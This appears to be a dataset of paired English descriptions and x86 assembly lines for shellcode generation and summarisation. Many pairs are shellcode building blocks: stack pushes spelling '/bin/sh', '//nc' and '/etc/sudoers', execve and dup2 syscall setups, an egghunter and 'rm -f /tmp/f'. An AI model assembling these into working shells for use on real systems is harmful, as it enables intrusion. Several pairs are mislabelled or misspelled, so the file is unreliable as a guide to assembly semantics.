ShellCodeGen: store 78 decimal into edx,"mov edx, 78"
ShellCodeGen: compare if ecx is zero,"cmp ecx, 0"
ShellCodeGen: move 0x2 into ebx,"mov ebx, 0x2"
ShellCodeGen: move 0x3 into bl,"mov bl, 0x3"
ShellCodeGen: jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \n l1 IncAddr \n jmp edi
"ShellCodeSum: mov cl, bl \n sub cl, 1 \n jnz loop",move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
ShellCodeGen: push 0x66 to the stack,push 0x66
"ShellCodeSum: cmp bl, 0xaa \n je shellcode",jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
ShellCodeSum: jz 0x8,jump to 0x8 if zero
"ShellCodeSum: test bl, bl \n jz not_found",jump to the label not_found if the contents of the bl register is not zero
ShellCodeSum: pop ecx,restore ecx register
ShellCodeGen: jump to 0x8 if zero,jz 0x8
ShellCodeGen: move 23 into al,"mov al, 23"
ShellCodeSum: push offset printf_msg,push address of string print_msg
ShellCodeGen: push the byte 0x7 onto the stack and point edx to the stack register,"push byte 0x7 \n mov edx, esp"
ShellCodeGen: perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx,"xor ebx, word __flag_byte"
"ShellCodeSum: add esi, 4",add 4 to the contents of the esi register
ShellCodeSum: jmp _while_loop,jump to the _while_loop label
"ShellCodeSum: mov ecx, [esi+4*eax]",move the 4 bytes of data at address esi+4*eax into ecx
ShellCodeSum: push byte 0x2e,push the byte 0x2e onto the stack
ShellCodeGen: close,"mov eax, 6"
"ShellCodeSum: lea ecx, [zero_reg+117]",load the effective address [zero_reg+117] into ecx
ShellCodeGen: add 10 to the contents of eax,"add eax, 10"
ShellCodeGen: jump to the shellcode label,jmp shellcode
ShellCodeGen: if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register,"test eax, eax \n jz close \n mov ebx, edx"
ShellCodeGen: perform and operation on the variable mask1 and 128,"and mask1, 128"
ShellCodeSum: buffersize: dw 1024,declare buffersize to be a word containing 1024
ShellCodeGen: swap the contents of the ebx register with the contents of the edx register,"xchg ebx, edx"
ShellCodeGen: push 0x29 onto the stack,push 0x29
ShellCodeGen: get the process ID,"mov eax, 20"
"ShellCodeSum: add esi, eax",add the contents of the eax register to the contents of esi register
"ShellCodeSum: xor ecx, ecx",zero out ecx
ShellCodeGen: push the 0x682f2f2f value onto the stack,push 0x682f2f2f
ShellCodeSum: write:,declare the write label
ShellCodeSum: jmp short 0x2c,jump short to 0x2c
ShellCodeGen: define execfile function,execfile:
"ShellCodeSum: sub ax, 1564",subtract 1564 from the contents of ax register and save the result in ax
ShellCodeGen: init the esi register to 0,"xor esi, esi"
"ShellCodeSum: mov cx, word_table[3]",move the 4th element of the array word_table into cx
ShellCodeGen: push the 0x6e69622f onto the stack,push 0x6e69622f
ShellCodeGen: push the dword 0x64777373 onto the stack,push dword 0x64777373
ShellCodeSum: inc edx,increment the contents of the edx register
ShellCodeGen: if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label,"cmp bl, 0xaa \n je shellcode"
"ShellCodeSum: mov edx, readlen",move readlen into edx
ShellCodeGen: push the word 0x3582 onto the stack,push word 0x3582
ShellCodeGen: move 0x7 into bl,"mov bl, 0x7"
ShellCodeSum: push byte 0x04 \n pop eax,put the syscall 0x04 into the eax register
ShellCodeGen: load the effective address of the operation bp+0x0b] into the bx register,"lea bx, [bp+0x0b]"
"ShellCodeSum: mov edx, ecx",move ecx to edx
ShellCodeGen: define the numeric label 3,3:
"ShellCodeSum: add eax, 40000h",add 40000h to eax register
ShellCodeSum: push 0x68736164,push 0x68736164 to the stack
"ShellCodeSum: push word 0x632d \n mov eax, esp",push the word 0x632d onto the stack and point the eax register to the stack register
ShellCodeGen: decrement the edx register by one,dec edx
"ShellCodeSum: mov eax, 1",terminate the process
ShellCodeGen: push the 0x682d onto the stack,pushw 0x682d
"ShellCodeSum: mov ah, 0x80",move 0x80 into ah
"ShellCodeSum: mov byte [esi+11], al",move al into the byte at address [esi+11]
ShellCodeGen: divide the contents of eax by the contents of ebx,div ebx
ShellCodeGen: push 0x69622f2f to the stack,push 0x69622f2f
ShellCodeGen: declare the decrypt label,decrypt:
ShellCodeSum: push byte 0x04,push the byte 0x04 onto the stack
"ShellCodeSum: lea ecx, [zero_reg+3]",load the effective address of the result of the operation [zero_reg+3] into the ecx register
ShellCodeSum: jmp short todo,jump short to the todo label
ShellCodeGen: jump to the _dup2_loop label if the previous instruction clears the sign flag,jns _dup2_loop
ShellCodeGen: push the 0x69622f65 onto the stack,push 0x69622f65
ShellCodeGen: decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register,loopnz next \n jmp ecx
ShellCodeGen: push 0x81e3a8c0 onto the stack,push 0x81e3a8c0
ShellCodeGen: move the contents of the esi register into the long starting at the address [esi+18],"mov long [esi+18], esi"
"ShellCodeSum: mov eax, ebx",move the address in ebx into eax
ShellCodeGen: system call execve,"mov eax, 11"
ShellCodeGen: create the doubleword variable var_a in memory and initialize it to zero,var_a: dd 0x0
ShellCodeGen: pop the top element of the stack into memory at the four bytes starting at location eax,pop [eax]
"ShellCodeSum: shr eax, 28",right shift the contents of eax register by 28 bit positions
"ShellCodeSum: mov [ebp+12], ecx",move ecx into the address [ebp+12]
ShellCodeSum: push word 0xc005,push the word 0xc005 onto the stack
"ShellCodeSum: mov eax, 13",invoke sys_time
ShellCodeSum: jz exit,jump to the exit label if the zero flag is set
ShellCodeSum: fupdisasm:,define fupdisasm function
ShellCodeGen: decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label,loop decode \n jmp Shellcode
"ShellCodeSum: mov esi, 0x735f6176",move 0x735f6176 into esi
ShellCodeGen: compare the doubleword stored at memory location var to the integer value 10,"cmp dword [var], 10"
ShellCodeGen: decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative,dec ecx \n jns 2f_loop
"ShellCodeSum: cmp byte [esi], 0xD \n jle wrap_around",jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
ShellCodeGen: define the byte string 'rm -f /tmp/f',db 'rm -f /tmp/f'
ShellCodeGen: load the effective address of the operation [bp+di+0x3e] into the dx register,"lea dx, [bp+di+0x3e]"
ShellCodeGen: move 0x30 into al,"mov al, 0x30"
ShellCodeSum: call near stageaddress,call the near function
ShellCodeSum: push ebx,push ebx onto the stack
ShellCodeGen: subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative,"sub dl, 5 \n jns l4"
ShellCodeGen: delcare the dup2loop label,dup2loop:
"ShellCodeSum: lea ebx, [esp]",load the effective address of esp into ebx
"ShellCodeSum: xor ecx, ecx \n cmp ebx, ecx \n je l1",zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register
ShellCodeGen: move a byte from the address buff+ecx into al,"mov al, byte[buff+ecx]"
ShellCodeSum: push 0x752f2f2f,push 0x752f2f2f onto the stack
ShellCodeGen: push 0x1 onto the stack,push 0x1
ShellCodeGen: move the memory address of filecontents variable into eax,"mov eax, filecontents"
ShellCodeGen: push edx to the stack,push edx
"ShellCodeSum: mov ecx, ebp",move ebp into ecx
ShellCodeSum: int 80h,make kernel call to exit program
"ShellCodeSum: push word 1 \n mov eax, esp",push the word 1 onto the stack and point eax to the stack register
"ShellCodeSum: mov ax, bx",move bx into ax
ShellCodeGen: compare ecx with 0h,"cmp ecx, 0h"
ShellCodeGen: push the 0x74756f2f onto the stack,push 0x74756f2f
ShellCodeSum: pop ebx,restore the top of the stack into ebx register
ShellCodeSum: call esi,call the esi function
ShellCodeSum: pop ebp,restore the top of the stack into the ebp register
ShellCodeGen: push 0x31313131 onto the stack,push 0x31313131
ShellCodeSum: filecontents: resb 128,reserve filecontents variable of 128 bytes
ShellCodeGen: call the function in esp,call [esp]
"ShellCodeSum: xor ax, 0x4f73",perform the xor operation between the ax register and the value 0x4f73
ShellCodeGen: put the syscall 8 into the eax register,push byte 8 \n pop eax
ShellCodeSum: jz short loc_402b13,if 0 then jump to loc_402b13
ShellCodeGen: define a string db and initialize to 'hello world!',"contents db 'hello world!', 0h"
ShellCodeGen: push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register,"push 0x6e69622f \n push 0x7273752f \n mov eax, esp"
ShellCodeGen: declare global _start,global _start
ShellCodeGen: invoke subroutine accept,"mov ebx, 5"
"ShellCodeSum: xor edx, edx",zero out edx
"ShellCodeSum: push 0x2f2f2f2f \n mov esi, esp",push the value 0x2f2f2f2f onto the stack and point esi to the stack register
ShellCodeGen: push the 0x6e onto the stack,push 0x6e
ShellCodeGen: jump to the numeric label 1 if the zero flag is cleared,jnz 1
"ShellCodeSum: sub eax, 0x013ffeff",subtract 0x013ffeff from the contents in eax and save the result in eax
ShellCodeGen: jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270,"cmp DWORD [edx], 0x636f7270 \n je while"
ShellCodeGen: move esp into ecx,"mov ecx, esp"
"ShellCodeSum: mov eax, 5",open the file
ShellCodeSum: jne _nex,if not equal jump to the _nex label
ShellCodeGen: reserve 1 word for variableName2,variablename2: resw 1
ShellCodeSum: push edx,push edx on the stack
ShellCodeGen: push the dword 0x68732f63 onto the stack,push dword 0x68732f63
ShellCodeSum: push byte +0xb,push the byte +0xb onto the stack
ShellCodeGen: push bx to the stack,push bx
"ShellCodeSum: mov al, 0x4",move 0x4 into al
"ShellCodeSum: add edx, 16",set edx to next 16 byte block
ShellCodeGen: define call_shellcode label,call_shellcode:
"ShellCodeSum: mov al, byte [esi]",move the byte at the address [esi] into al
ShellCodeSum: section .text,declare code section
ShellCodeGen: push '//sh' onto the stack,push '//sh'
ShellCodeGen: declare section containing uninitialized data,section .bss
ShellCodeGen: move the byte at the address 3h into al,"mov al, byte 3h"
ShellCodeSum: jz next_cycle,jump to the next_cycle label if the zero flag is set
ShellCodeGen: push the word 0x7065 onto the stack,push word 0x7065
ShellCodeGen: invoke sys_time,"mov eax, 13"
ShellCodeSum: next_page:,declare next_page function
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register,"cmp DWORD [eax], edx \n jne loop \n jmp eax"
"ShellCodeSum: mov bl, byte [digits+ebx]",move the byte at address digits+ebx into bl
"ShellCodeSum: mov byte [ecx+92], dl",move dl into the single byte at the address stored in ecx+92
ShellCodeGen: push 0bh onto the stack,push 0bh
ShellCodeSum: jmp ecx,jump to ecx
ShellCodeSum: call _myfunc,call the _myfunc function
ShellCodeGen: push the contents of the ebx register onto the stack and point ecx to the stack register,"push ebx \n mov ecx, esp"
ShellCodeGen: make the system call to install the signal handler,"mov eax, 48"
ShellCodeSum: read:,declare the read label
ShellCodeGen: define the cmd label,cmd:
"ShellCodeSum: cmp al, 0xf2",compare the contents of the al register with the value 0xf2
"ShellCodeSum: z dd 1, 2, 3",declare three doubleword values initialized to 1 2 and 3 at address z
ShellCodeGen: move doublewords from the stack into the 32 bit registers,popad
ShellCodeGen: declare bss section,section .bss
ShellCodeSum: shift_decode:,declare the shift_decode label
ShellCodeGen: move 8h into ax,"mov ax, 8h"
ShellCodeGen: push the double word 2 onto the stack,push dword 0x2
"ShellCodeSum: xor eax, eax",init eax 0
ShellCodeGen: move 0x169 into ax,"mov ax, 0x169"
"ShellCodeSum: mov al, cl",move cl into al
"ShellCodeSum: mov edx, ebp",move ebp into edx
ShellCodeGen: add ax to bx,"add bx, ax"
"ShellCodeSum: shl edx, 24",left shift the contents of the edx register by 24 bits
ShellCodeGen: specify exit syscall,"mov eax, 1"
ShellCodeSum: push word 0x6666,push the word 0x6666 onto the stack
ShellCodeGen: declare the two label,two:
ShellCodeGen: subtract 0x0efc3532 from the contents in eax and save the result in eax,"sub eax, 0x0efc3532"
"ShellCodeSum: xor bl, 0xbb",perform a logical xor between the bl register and 0xbb and save the result in bl
"ShellCodeSum: mov eax, 5",open
ShellCodeGen: point ecx to the top of the stack,"mov ecx, esp"
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov eax, esp"
ShellCodeSum: child:,define the child label
ShellCodeGen: if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8,"cmp edx, ebx \n je 0x8 \n"
"ShellCodeSum: lea ebx, [ebp-8]",load the effective address of ebp-8 into the ebx register
ShellCodeGen: zero out the edx register,"xor edx, edx"
"ShellCodeSum: cmp al, 0xf2 \n je fillOnes",jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
"ShellCodeSum: push 0x64687373 \n mov ecx, esp",push the value 0x64687373 onto the stack and point the ecx register to the stack register
ShellCodeGen: move 0x12 into bh,"mov bh, 0x12"
ShellCodeGen: move 0x14 into bl,"mov bl, 0x14"
ShellCodeSum: inc al,increment the contents of the al register
"ShellCodeSum: mov edx, m_src4",move m_src4 to edx
"ShellCodeSum: lea eax, [val]",place the value val in eax
ShellCodeGen: push the contents of the esi register onto the stack and point ebx to the stack register,"push esi \n mov ebx, esp"
ShellCodeGen: push 0x68732f2f to the stack,push 0x68732f2f
ShellCodeGen: pop the value on the stack back into ecx,pop ecx
"ShellCodeSum: mov eax, 63",dup2
"ShellCodeSum: mov [ebp+22], word ax",move the word in ax into the memory location specified by the operation [ebp+22]
ShellCodeSum: push 0x1a,push 0x1a onto the stack
ShellCodeGen: compare the contents of al with the cl register,"cmp al, cl"
"ShellCodeSum: cmp eax, eax \n jne 0x8",jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register
ShellCodeGen: push the word 0x7365 onto the stack,push word 0x7365
ShellCodeSum: big_number dd 123456789,define the doubleword variable big_number and initialize it to 123456789
ShellCodeGen: mul eax by ebx,mul ebx
"ShellCodeSum: mov ax, 9",get 9 in the ax
ShellCodeGen: subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative,"sub bl, 4 \n jns l2"
"ShellCodeSum: mov eax, edx",move the remainder into eax
ShellCodeGen: declare a constant size and set equal to 25,dim: equ 25
ShellCodeGen: if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct,"test eax, eax \n jnz l1 \n call myfunct"
ShellCodeGen: jump to the dup2 label if the previous instruction clears the sign flag,jns dup2
ShellCodeGen: set the edx register to null,"xor edx, edx"
ShellCodeGen: push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ebx, esp"
ShellCodeSum: push byte +0x66,push the byte +0x66 onto the stack
"ShellCodeSum: mov ecx, esp",move esp into ecx
ShellCodeGen: define check_even_odd function,check_even_odd:
ShellCodeSum: push byte 15 \n pop eax,put the syscall 15 into the eax register
"ShellCodeSum: mov ebx, [ebx+esi]",move the contents of memory address ebx+esi into ebx
"ShellCodeSum: mov eax, 4",move 4 into eax
ShellCodeGen: if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3,"cmp cl, dl \n jb l3"
"ShellCodeSum: mov eax, mxcsr",move mxcsr to eax
ShellCodeGen: move 66729180 into edx,"mov edx, 66729180"
ShellCodeSum: decrypt:,declare the decrypt label
ShellCodeSum: push 0x7273752f,push 0x7273752f onto the stack
"ShellCodeSum: mov [var], ebx",move the contents of ebx into the 4 bytes at memory address var
ShellCodeSum: push word 0x6873,push the word 0x6873 onto the stack
"ShellCodeSum: xor ebx, ebx \n mul ebx",zero out the eax register and the ebx register
"ShellCodeSum: mov bl, 0x01",move 0x01 into bl
ShellCodeSum: push dword 0x61747069,push the doubleword 0x61747069 to the stack
ShellCodeSum: push eax,push eax on the stack
ShellCodeGen: put the syscall 0x2 into the eax register,push byte 0x2 \n pop eax
ShellCodeSum: incaddr:,declare the incaddr label
"ShellCodeSum: lea ecx, [esi+8]",load the effective address of the result of the operation [esi+8] into the ecx register
ShellCodeGen: jump to even_numer if greater,je even_number
ShellCodeGen: move buff to ebx,"mov ebx, buff"
ShellCodeSum: jmp short _load_data,jump short to _load_data label
ShellCodeGen: move readlen into edx,"mov edx, readlen"
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point edx to the stack register,"push 0x2f2f2f2f \n mov edx, esp"
"ShellCodeSum: add ebx, 2",add decimal integer 2 to ebx
ShellCodeSum: one:,declare one label
"ShellCodeSum: mov eax, filecontents",move the memory address of filecontents variable into eax
ShellCodeSum: createfile:,declare the createfile label
ShellCodeSum: push esi,push the contents of esi register onto the stack
ShellCodeGen: push the 0x6475732f onto the stack,push 0x6475732f
ShellCodeGen: push 0x65726f43 onto the stack,push 0x65726f43
ShellCodeGen: define message byte and initialize it to '/bin/sh',message db '/bin/sh'
ShellCodeSum: push 2,push 2 onto the stack
ShellCodeGen: add eax to esi,"add esi, eax"
ShellCodeGen: move cl into al,"mov al, cl"
ShellCodeSum: _build:,define the _build label
"ShellCodeSum: mov dl, 0x01",move 0x01 into dl
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jl lowbound",if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label
"ShellCodeSum: sub bl, 4 \n jns l2",subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative
ShellCodeSum: push byte 17h,push the byte 17h onto the stack
"ShellCodeSum: add ecx, ebx",add ebx to ecx
"ShellCodeSum: mov eax, [esp]",move the contents of memory address esp into eax
ShellCodeGen: move the contents of the address [ebp-8] into the ebx register,"mov ebx, [ebp-8]"
ShellCodeGen: move the value 0x4 into the al register,"mov al, 0x4"
"ShellCodeSum: sub bx, 1663",subtract 1663 from bx and save the result into bx
ShellCodeSum: push 0x76766c2d,push 0x76766c2d to the stack
"ShellCodeSum: mov [ebx], 110",move 110 into the effective address saved in ebx
ShellCodeGen: push the word 0xffff to the stack,push word 0xffff
"ShellCodeSum: lea edi, [esi +1]",load the effective address of [esi + 1] into the edi register
ShellCodeGen: move the contents of the esi register into the ax register,"mov ax, [esi]"
"ShellCodeSum: cmp al, bl \n jb l2",if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2
"ShellCodeSum: mov eax, 67",make the system call to install portable signal handler
"ShellCodeSum: mov dword [esp-0x14], 0x6d6f646e",move the value 0x6d6f646e into the double word starting at the address [esp-0x14]
ShellCodeGen: jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \n jnz _end \n jmp edi
ShellCodeGen: if zero jump to the encoded label,jz encoded
"ShellCodeSum: mov bl, byte 0eh",move the byte at the address 0eh into bl
ShellCodeGen: push the byte 0x2 onto the stack,push byte 0x2
ShellCodeSum: jmp fupdisasm+1,jump to fupdisasm+1
"ShellCodeSum: cmp eax, ebx \n je exit",jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
ShellCodeGen: compare the byte at the memory location buff with 7ah,"cmp byte [buff], 7ah"
"ShellCodeSum: cmp esi, edx \n je find_egg",jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register
"ShellCodeSum: cmp eax, ebx",compare the contents of the eax register and the contents of the ebx register
ShellCodeGen: push the word 0x0f27 onto the stack,push word 0x0f27
ShellCodeGen: allocate memory for 30 bytes uninitialized name variable,name db 30 dup
"ShellCodeSum: mov [ebx+12], eax",move eax into ebx+12
ShellCodeGen: if the contents of the eax register is negative then jump to the label close,"test eax, eax \n js close"
ShellCodeGen: call the strlen function,call strlen
ShellCodeGen: declare the next_addr label,next_addr:
ShellCodeGen: right shift the contents of eax register by 28 bit positions,"shr eax, 28"
"ShellCodeSum: sub al, 1 \n jns l1",subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov esi, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register
ShellCodeSum: _exec:,define the _exec label
ShellCodeGen: load the effective address of the result of the operation [esi+15] into the ebx register,"lea ebx, [esi+15]"
ShellCodeGen: define the _next label,_next:
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7",jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register
ShellCodeGen: make the system to load and run the program,"mov eax, 11"
"ShellCodeSum: loop l4 \n mov edx, esp",decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register
ShellCodeGen: jump to the _while_loop label if the operands of the above comparison are not equals,jne short _while_loop
ShellCodeSum: push word 0x1ff,push the word 0x1ff onto the stack
ShellCodeSum: hellolen: equ $-hello,define hellolen equal to the length of the hello string
ShellCodeGen: left shift cx,"shl cx, 1"
ShellCodeGen: declare the loader label,loader:
ShellCodeSum: call_egghunter:,define the call_egghunter label
ShellCodeSum: jns 3f,jump to 3f if the sign flag is zero
"ShellCodeSum: mov ebx, 10",move decimal value 10 into ebx
ShellCodeGen: push 1 onto the stack,push 1
"ShellCodeSum: mov edx, filename",move filename into edx
ShellCodeSum: jns decode_pr,jump to decode_pr if not signed
ShellCodeSum: push byte 1,push the byte 1 to the stack
"ShellCodeSum: mov bl, 0x8",move 0x8 into bl
ShellCodeSum: push byte +0x1,push the byte +0x1 onto the stack
ShellCodeGen: move al into the byte at address [esi+10],"mov byte [esi+10], al"
"ShellCodeSum: mov cl, 128",move 128 into cl
ShellCodeSum: push 0x2e323931,push 0x2e323931 to the stack
"ShellCodeSum: cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax",jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov eax, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register
ShellCodeSum: push byte 17h \n pop eax,put the syscall 17h into the eax register
"ShellCodeSum: shr ebx, 2",divide ebx by 4 using right shift
"ShellCodeSum: mov edi, eax",move eax into edi
"ShellCodeSum: add eax, 0x12345678",add 0x12345678 to the contents in eax and save the result in eax
"ShellCodeSum: mov [esi], al",move the contents of the al register into the esi register
ShellCodeGen: move 1+0feh into dl,"mov dl, 1+0feh"
ShellCodeGen: define msg variable and initialize with 'i love you!',"msg db 'i love you!', 0ah"
ShellCodeSum: mul ecx,multiply eax by the contents of the ecx register
"ShellCodeSum: mov eax, 37",send signal to another process
"ShellCodeSum: lea edx, [esi+26]",load the effective address [esi+26] into edx
ShellCodeSum: push eax,push eax onto stack
ShellCodeGen: move al into the address [esi+34],"mov [esi+34], al"
"ShellCodeSum: cmp al, bl \n ja l2 \n add eax, 3",if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register
"ShellCodeSum: mov eax, 20",get the process ID
ShellCodeSum: push byte VALUE \n pop eax,put the byte VALUE into the eax register
ShellCodeSum: push byte +0x3,push the byte +0x3 onto the stack
ShellCodeGen: make the system call to create a new process,"mov eax, 2"
ShellCodeGen: load the effective address of the result of the operation [eax] into the ecx register,"lea ecx, [eax]"
"ShellCodeSum: mov cx, 0x401",move 0x401 into cx
ShellCodeGen: get 9 in the ax,"mov ax, 9"
ShellCodeGen: jump short to call_decoder,jmp short call_decoder
ShellCodeSum: push ebx,push the contents of ebx onto the stack
"ShellCodeSum: mov eax, 7",waitpid
ShellCodeGen: push the 0x68732f6e onto the stack,push 0x68732f6e
"ShellCodeSum: add esi, 4",add 4 to esi
ShellCodeGen: define the label 3,3:
ShellCodeSum: push 0x6374652f,push 0x6374652f onto the stack
ShellCodeSum: push 0x69622f65,push the 0x69622f65 onto the stack
ShellCodeSum: push _ip,push _ip onto the stack
ShellCodeGen: right shift by 3 bit positions the contents of var variable,"shr [var], 3"
ShellCodeGen: exchange the contents of the ebx register with the contents of the eax register,"xchg ebx, eax"
ShellCodeGen: load and run the program,"mov eax, 11"
ShellCodeGen: jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero,"xor cl, 0x32 \n jz short EncodedShellcode"
ShellCodeSum: duploop:,define duploop function
"ShellCodeSum: mov byte [eax], dl",move dl into the byte in eax
ShellCodeGen: compare the contents of bh and the contents of al,"cmp bh, al"
"ShellCodeSum: mov [ebx + 6], dl",move dl into the address [ebx + 6]
ShellCodeSum: push 0x29,push 0x29 onto the stack
ShellCodeGen: push the word 0x4255 onto the stack,push word 0x4255
"ShellCodeSum: add esi, 0x21354523",add 0x21354523 to the contents in esi and save the result in esi
ShellCodeGen: move eax into the address [esi+47],"mov [esi+47], eax"
ShellCodeSum: inc eax,increment eax
"ShellCodeSum: mov al, 0x8",put the syscall 0x8 into the al register
"ShellCodeSum: mov bl, 1",move 1 into bl
ShellCodeGen: push the dword 0x732f636f onto the stack,push dword 0x732f636f
ShellCodeGen: jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register,"cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40"
"ShellCodeSum: mov al, [byte_tbl+2]",move the effective address of byte_tbl+2 to al register
ShellCodeSum: loop do_dup,decrement the counter and jump to the do_dup label if the count is not zero
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp",move ASCII /bin/sh into ecx
ShellCodeGen: define connect function,connect:
ShellCodeSum: push 0x636e2f2f,push the 0x636e2f2f onto the stack
"ShellCodeSum: mov byte [esp], 0x7f",move 0x7f into the byte at address [esp]
ShellCodeGen: move the byte at address digits+ebx into bl,"mov bl, byte [digits+ebx]"
ShellCodeSum: jns loop,jump to the loop label if the previous instruction clears the sign flag
ShellCodeSum: push [var],push the 4 bytes at address var onto the stack
"ShellCodeSum: xor edx, edx \n push edx",zero out the edx register and push zero onto the stack
ShellCodeGen: if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register,"cmp al, bl \n ja l2 \n add eax, 3"
"ShellCodeSum: mov [esp+4], esp",move esp into the address [esp+4]
ShellCodeGen: go to file offset,"mov eax, 19"
"ShellCodeSum: test eax, eax \n jnz do_next_accept",jump to the label do_next_accept if the contents of the eax register is not zero
ShellCodeGen: push the dword 0x6e69922f onto the stack,push dword 0x6e69922f
ShellCodeGen: multiply the contents of eax by 25,mul 25
ShellCodeSum: ja write,jump to write if greater
"ShellCodeSum: mov eax, 106",make the system call stat
"ShellCodeSum: mov long [esi+18], esi",move the contents of the esi register into the long starting at the address [esi+18]
ShellCodeSum: section .bss,declare section bss
ShellCodeSum: int 80h,make syscall to output the text to stdout
ShellCodeGen: restore the top of the stack into ebx register,pop ebx
ShellCodeGen: test the contents of the edx register,"test edx, edx"
"ShellCodeSum: mov eax, 0ah",move linefeed character into eax
ShellCodeGen: move 0x563a1f3e into esi,"mov esi, 0x563a1f3e"
ShellCodeGen: declare push_cmd label,push_cmd:
ShellCodeGen: jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi,scasd \n l1 IncAddr
ShellCodeGen: move the value 0x5f657a69 into the double word starting at the address [esp-0x10],"mov dword [esp-0x10], 0x5f657a69"
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov edx, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register
"ShellCodeSum: mov cl, 3",move 3 into cl
ShellCodeGen: pop the top of the stack into the esi register,pop esi
"ShellCodeSum: mov bl, 4",move 4 into bl
ShellCodeGen: move v to esi,"mov esi, v"
ShellCodeSum: jns _dup2_loop,jump to the _dup2_loop label if the previous instruction clears the sign flag
ShellCodeGen: push zero onto the stack,"xor eax, eax \n push eax"
ShellCodeGen: push the double word 0x0a206873 onto the stack,push dword 0x0a206873
"ShellCodeSum: mov eax, 0xb33fb33f",move 0xb33fb33f into eax
ShellCodeGen: decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label,loop check_even_odd \n jmp short shellcode
ShellCodeSum: var_a: dd 0x0,create the doubleword variable var_a in memory and initialize it to zero
"ShellCodeSum: or al, bl",perform or operation between al and bl registers
ShellCodeGen: call the jmp_search function,call jmp_search
ShellCodeGen: add ebx to eax,"add eax, ebx"
ShellCodeGen: invoke sys_open,"mov eax, 5"
ShellCodeSum: size: equ 50000,declare a constant size and set equal to 50000
ShellCodeSum: jl _while_loop,jump to the _while_loop if lower
"ShellCodeSum: mov ecx, esp",move the contents of esp into ecx
ShellCodeSum: push byte 37,push the byte 37 onto the stack
ShellCodeSum: push dword 0x0a206873,push the double word 0x0a206873 onto the stack
ShellCodeSum: push 0x6374652f,push the 0x6374652f onto the stack
"ShellCodeSum: mov ax, [esi]",move the contents of the esi register into the ax register
"ShellCodeSum: mov eax, 3",read the file
"ShellCodeSum: mov ebx, [ebp-8]",move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register
ShellCodeSum: push 0x29,push 0x29 to the stack
"ShellCodeSum: mov long [esi+22], esi",move the contents of the esi register into the long starting at the address [esi+22]
ShellCodeGen: jump to find_egg if zero,jz find_egg
"ShellCodeSum: push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ebx, esp",push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register
"ShellCodeSum: mov eax, 2",move the value two into eax
ShellCodeGen: right shift the value of register ecx by 2 bits,"sar ecx, 2"
"ShellCodeSum: push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp",move /bin/sh into the eax register
ShellCodeSum: call quit,call the quit function
"ShellCodeSum: push ebx \n mov eax, esp",push the contents of the ebx register onto the stack and point eax to the stack register
ShellCodeSum: jmp edx,jump to edx
ShellCodeGen: put the byte CHMOD_CALL into the eax register,push byte CHMOD_CALL \n pop eax
ShellCodeGen: add 4 to the esp register,"add esp, 4"
